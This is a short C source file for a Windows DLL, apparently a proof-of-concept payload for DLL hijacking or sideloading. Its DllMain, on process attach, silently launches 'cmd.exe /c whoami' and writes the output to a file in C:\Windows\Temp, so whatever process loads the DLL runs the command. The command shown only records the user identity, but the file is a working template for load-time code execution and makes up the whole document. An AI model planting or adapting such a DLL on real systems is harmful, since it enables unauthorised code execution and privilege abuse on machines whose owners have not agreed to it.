#include <windows.h>
#include <stdio.h>
// MantodKaz
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char *cmd = "cmd.exe /c whoami > C:\\Windows\\Temp\\kaz.txt";

    if (fdwReason == DLL_PROCESS_ATTACH) {
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
      
        DisableThreadLibraryCalls(hinstDLL);

        if (!CreateProcess(NULL,   // No module name (use command line)
                           cmd,    // Command to execute
                           NULL,   // Process handle not inheritable
                           NULL,   // Thread handle not inheritable
                           FALSE,  // Set handle inheritance to FALSE
                           0,      // No creation flags
                           NULL,   // Use parent's environment block
                           NULL,   // Use parent's starting directory 
                           &si,    // Pointer to STARTUPINFO structure
                           &pi))   // Pointer to PROCESS_INFORMATION structure
        {
            printf("CreateProcess failed (%d).\n", GetLastError());
        } else {
            // Wait for the command to complete
            WaitForSingleObject(pi.hProcess, INFINITE);

            // Close process and thread handles
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    return TRUE;
}
